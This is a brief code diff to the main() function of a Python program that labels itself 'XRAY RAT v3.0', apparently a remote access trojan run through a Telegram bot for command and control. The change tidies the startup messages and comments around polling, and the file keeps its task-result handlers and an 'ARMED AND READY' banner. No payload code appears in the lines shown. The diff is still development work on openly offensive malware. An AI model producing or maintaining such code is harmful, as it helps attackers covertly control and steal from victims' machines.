@@ -1799,7 +1799,6 @@ async def post_init(application):
     ]
     await application.bot.set_my_commands(commands)
 
-
 def main():
     print(BANNER)
     print(f"[+] XRAY RAT v3.0 — Initializing...")
@@ -1848,12 +1847,10 @@ def main():
     application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^/result'), process_task_result))
     
     print(f"[+] XRAY RAT v3.0 — ARMED AND READY")
-    print(f"[+] Bot: @{application.bot.username}")
-    print(f"[+] Send /start in Telegram to begin")
+    print(f"[+] Starting polling...")
     
-    # Start polling
+    # Start polling — handles initialization internally
     application.run_polling(allowed_updates=Update.ALL_TYPES)
-
 
 if __name__ == "__main__":
     main()
